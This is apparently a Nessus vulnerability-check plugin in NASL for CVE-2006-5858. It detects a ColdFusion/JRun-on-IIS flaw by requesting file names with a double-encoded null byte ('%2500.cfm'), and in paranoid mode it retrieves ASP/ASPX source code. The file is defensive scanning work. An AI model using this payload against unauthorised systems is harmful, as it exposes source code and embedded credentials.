#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24283);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2016/10/07 13:30:47 $");

  script_cve_id("CVE-2006-5858");
  script_bugtraq_id(21978);
  script_osvdb_id(32123);

  script_name(english:"ColdFusion / JRun on IIS Double Encoded NULL Byte Request File Content Disclosure");
  script_summary(english:"Tries to retrieve script source code using ColdFusion.");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote web server is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of ColdFusion running on the remote host allows an
attacker to view the contents of files not interpreted by ColdFusion
itself and hosted on the affected system. The problem is due to the
fact that with ColdFusion, URL-encoded filenames are decoded first by
IIS and then again by ColdFusion. By passing in a filename followed
by a double-encoded null byte and an extension handled by ColdFusion,
such as '.cfm', a remote attacker may be able to uncover sensitive
information, such as credentials and hostnames contained in scripts,
configuration files, etc.");
  # http://www.verisign.com/en_US/security-services/security-intelligence/vulnerability-reports/index.xhtml
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?411e3cea");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2007/Jan/198");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb07-02.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ColdFusion MX 7.0.1 if necessary and apply the appropriate
patch as described in the vendor advisory referenced above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/01/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/01/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/02/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl");
  script_require_ports("Services/www", 80, 8500);
  script_require_keys("installed_sw/ColdFusion");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Check whether it's vulnerable.
url = "/" + substr(SCRIPT_NAME, 0, strlen(SCRIPT_NAME)-6) + "-" + unixtime() + ".asp";
r = http_send_recv3(method:"GET", item:dir+url+"%2500.cfm", port:port, exit_on_fail: TRUE);
res = r[2];

# If it is...
if (
  "<title>JRun Servlet Error</title>" >< res &&
  "404 " +url+ "</h1>" >< res
)
{
  # Unless we're being paranoid, we're done.
  if (report_paranoia < 2)
  {
    if (report_verbosity > 0)
    {
      report =
        '\nNessus was able to verify this issue with the following request :\n'+
        '\n' + install_url + url + '\n' +
        '\nThis produced the following response : ' +
        '\n\n' + beginning_of_response(resp:res, max_lines:10) + '\n';
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
  # Otherwise, try to exploit the flaw to make sure we can get the
  # source code for an ASP or .NET script.
  else
  {
    max_files = 10;
    files = get_kb_list("www/"+port+"/content/extensions/asp");
    if (isnull(files)) files = get_kb_list("www/"+port+"/content/extensions/aspx");
    if (isnull(files)) files = make_list("/index.asp", "/Default.asp", "/index.aspx", "/Default.aspx");

    n = 0;
    foreach file (files)
    {
      # Try to get the source.
      r = http_send_recv3(method: "GET", item:file+"%2500.cfm", port:port, exit_on_fail: TRUE);
      res = r[2];

      # If it looks like the source code...
      if (
        (file =~ "\.asp$" && "<%" >< res && "%>" >< res) ||
        (file =~ "\.aspx$" && "<%@ " >< res)
      )
      {
        # Now run the script.
        r = http_send_recv3(method: "GET", item:file, port:port, exit_on_fail: TRUE);
        res2 = r[2];

        # There's a problem if the response does not look like source code this time.
        if (
          (file =~ "\.asp$" && "<%" >!< res2 && "%>" >!< res2) ||
          (file =~ "\.aspx$" && "<%@ " >!< res2)
        )
        {
          report =
            'Here is the source that Nessus was able to retrieve for the URL \n'            + "'" + (install_url - dir) + file + "' :" + '\n' +
            '\n' + res;
          security_warning(port:port, extra:report);
          exit(0);
        }
      }
      if (n++ > max_files) exit(0);
    }
  }
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
